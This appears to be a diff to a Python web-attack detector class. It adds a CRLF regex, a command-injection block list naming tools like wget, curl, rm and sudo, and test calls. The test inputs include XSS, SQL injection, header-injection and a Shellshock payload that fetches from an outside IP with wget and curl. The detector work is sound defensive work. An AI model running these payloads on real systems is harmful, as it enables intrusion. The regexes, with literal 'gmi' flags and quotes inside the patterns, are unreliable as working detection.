@@ -11,7 +11,7 @@ class detection:
             return False
 
     def crlf_detector(self,s):
-        str=""
+        str="\\r|\\n\"gmi\""
 
         regexp = re.compile(str)
         if regexp.search(s):
@@ -20,7 +20,7 @@ class detection:
             return False
 
     def command_detector(self,s):
-        str=""
+        str="'\&|\||\`|\$()|\/bin|chmod|ls|chown|grep|alias|pwd|cd|sudo|rm|mv|mkdir|touch|;|\./|htop|ps|apt|pacman|yum|kill|wget|exec|/usr|c:\\|curl'gmi"
 
         regexp = re.compile(str)
         if regexp.search(s):
@@ -230,3 +230,5 @@ class detection:
 a=detection()
 print(a.xss_detector("ABC<div style=\"x:expression\x5C(javascript:alert(1)\">DEF"))
 print(a.sqli_detector("AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"))
+print(a.crlf_detector("\r\n Header-Test:BLATRUC"))
+print(a.command_detector("() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'"))
